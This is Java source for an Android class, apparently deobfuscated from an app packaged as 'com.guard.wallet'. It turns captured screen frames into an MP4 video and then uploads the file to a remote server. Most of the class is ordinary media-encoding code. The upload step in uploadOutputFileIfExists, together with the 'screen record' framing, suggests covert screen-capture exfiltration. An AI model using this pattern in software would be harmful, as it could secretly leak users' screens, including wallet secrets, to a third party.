package com.guard.wallet.thread;

import com.guard.wallet.core.AppUtils;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Rect;
import android.media.MediaCodec;
import android.media.MediaCodec.BufferInfo;
import android.media.MediaCodecInfo;
import android.media.MediaCodecList;
import android.media.MediaFormat;
import android.media.MediaMuxer;
import android.util.Log;
import android.view.Surface;
import java.io.File;
import java.util.LinkedList;
import java.util.concurrent.Callable;

/**
 * 位图序列转 MP4 任务 — 将 Bitmap 数组编码为 H.264 MP4 文件并上传。
 *
 * vendor 原始类名: com.guard.wallet.thread.i
 * 用于屏幕录制流程：先捕获 Bitmap 帧，再编码/上传。
 */
public final class BitmapToMp4Task implements Callable<Boolean> {
    private static final String TAG = "BitmapToMp4Task";
    private static final String MIME_TYPE = "video/avc";
    private static final long DEQUEUE_TIMEOUT_US = 10_000L;

    public final Bitmap[] a;
    public final String b;
    public final MediaFormat c;
    public final MediaMuxer d;
    public final MediaCodec e;

    public BitmapToMp4Task(Bitmap[] bitmaps, String outputPath, MediaFormat mediaFormat) {
        this.a = bitmaps;
        this.b = outputPath;
        this.c = mediaFormat;
        this.d = createMuxer(outputPath);
        this.e = createCodec(mediaFormat);
    }

    @Override
    public Boolean call() {
        if (this.d == null || this.e == null || this.c == null || this.a == null || this.a.length == 0) {
            return Boolean.TRUE;
        }

        Surface surface = null;
        boolean muxerStarted = false;
        int trackIndex = -1;

        try {
            surface = this.e.createInputSurface();
            this.e.start();

            int width = this.c.getInteger("width");
            int height = this.c.getInteger("height");
            Rect targetRect = new Rect(0, 0, width, height);

            for (Bitmap bitmap : this.a) {
                if (bitmap == null) {
                    continue;
                }

                Bitmap frame = null;
                try {
                    frame = com.guard.wallet.utils.SystemHelper.y(bitmap);
                    Canvas canvas = surface.lockCanvas(targetRect);
                    canvas.drawBitmap(frame, null, targetRect, null);
                    surface.unlockCanvasAndPost(canvas);
                    DrainResult result = drainEncoder(false, trackIndex, muxerStarted);
                    trackIndex = result.trackIndex;
                    muxerStarted = result.muxerStarted;
                } catch (Exception ex) {
                    AppUtils.s(TAG, ex);
                } finally {
                    com.guard.wallet.utils.SystemHelper.J0(frame);
                    com.guard.wallet.utils.SystemHelper.J0(bitmap);
                }
            }

            this.e.signalEndOfInputStream();
            DrainResult result = drainEncoder(true, trackIndex, muxerStarted);
            trackIndex = result.trackIndex;
            muxerStarted = result.muxerStarted;

            uploadOutputFileIfExists();
            Log.d(TAG, "screen record success...");
            return Boolean.TRUE;
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            return Boolean.TRUE;
        } finally {
            releaseCodec();
            releaseMuxer(muxerStarted);
            if (surface != null) {
                try {
                    surface.release();
                } catch (Exception ex) {
                    AppUtils.s(TAG, ex);
                }
            }
        }
    }

    private MediaMuxer createMuxer(String outputPath) {
        if (AppUtils.B(outputPath)) {
            return null;
        }
        try {
            return new MediaMuxer(outputPath, MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4);
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            return null;
        }
    }

    private MediaCodec createCodec(MediaFormat mediaFormat) {
        if (mediaFormat == null) {
            return null;
        }
        try {
            MediaCodecInfo codecInfo = findAvcEncoder();
            if (codecInfo == null) {
                return null;
            }
            MediaCodec codec = MediaCodec.createByCodecName(codecInfo.getName());
            codec.configure(mediaFormat, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
            return codec;
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            return null;
        }
    }

    private MediaCodecInfo findAvcEncoder() {
        try {
            int count = MediaCodecList.getCodecCount();
            for (int index = 0; index < count; index++) {
                MediaCodecInfo codecInfo = MediaCodecList.getCodecInfoAt(index);
                if (!codecInfo.isEncoder()) {
                    continue;
                }
                for (String type : codecInfo.getSupportedTypes()) {
                    if (MIME_TYPE.equalsIgnoreCase(type)) {
                        return codecInfo;
                    }
                }
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
        return null;
    }

    private DrainResult drainEncoder(boolean endOfStream, int trackIndex, boolean muxerStarted) {
        BufferInfo bufferInfo = new BufferInfo();

        while (true) {
            int outputIndex = this.e.dequeueOutputBuffer(bufferInfo, DEQUEUE_TIMEOUT_US);
            if (outputIndex == MediaCodec.INFO_TRY_AGAIN_LATER) {
                if (!endOfStream) {
                    return new DrainResult(trackIndex, muxerStarted);
                }
                continue;
            }

            if (outputIndex == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) {
                if (!muxerStarted) {
                    trackIndex = this.d.addTrack(this.e.getOutputFormat());
                    this.d.start();
                    muxerStarted = true;
                }
                continue;
            }

            if (outputIndex < 0) {
                continue;
            }

            java.nio.ByteBuffer outputBuffer = this.e.getOutputBuffer(outputIndex);
            if (outputBuffer != null && bufferInfo.size > 0 && muxerStarted && trackIndex >= 0) {
                outputBuffer.position(bufferInfo.offset);
                outputBuffer.limit(bufferInfo.offset + bufferInfo.size);
                this.d.writeSampleData(trackIndex, outputBuffer, bufferInfo);
            }
            this.e.releaseOutputBuffer(outputIndex, false);

            if ((bufferInfo.flags & MediaCodec.BUFFER_FLAG_END_OF_STREAM) != 0) {
                return new DrainResult(trackIndex, muxerStarted);
            }
        }
    }

    private void uploadOutputFileIfExists() {
        if (AppUtils.B(this.b)) {
            return;
        }
        File outputFile = new File(this.b);
        if (!outputFile.exists()) {
            return;
        }
        LinkedList<File> files = new LinkedList<>();
        files.add(outputFile);
        com.guard.wallet.http.HttpApiManager.uploadVideoFiles(files);
    }

    private void releaseCodec() {
        try {
            this.e.stop();
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
        try {
            this.e.release();
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
    }

    private void releaseMuxer(boolean started) {
        try {
            if (started) {
                this.d.stop();
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
        try {
            this.d.release();
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
    }

    private static final class DrainResult {
        final int trackIndex;
        final boolean muxerStarted;

        DrainResult(int trackIndex, boolean muxerStarted) {
            this.trackIndex = trackIndex;
            this.muxerStarted = muxerStarted;
        }
    }
}
